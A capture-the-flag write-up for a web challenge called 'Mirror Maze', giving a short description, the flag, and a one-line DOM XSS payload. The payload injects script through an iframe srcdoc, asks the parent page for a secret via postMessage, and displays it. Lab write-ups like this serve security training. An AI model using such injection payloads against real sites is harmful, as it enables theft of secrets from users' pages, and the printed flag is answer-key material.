# Mirror Maze(250 pts)

## Desc:

    The dev team tried to be safe: user input is reflected into a sandboxed preview iframe and angle brackets are escaped. But a convenience feature was left in for debugging — and that’s your way in. Can you trick the preview into running script that asks the parent page for the secret?


## Solution:

    a dom xss vulnerability...running this in console will get the flag:

    srcdoc:<script>window.addEventListener('message', e => { document.body.innerText = 'FLAG: ' + e.data.flag; console.log('FLAG:', e.data.flag); }); parent.postMessage('get-flag','*')</script>


## Flag:

	
    bab{dom_xss_master}
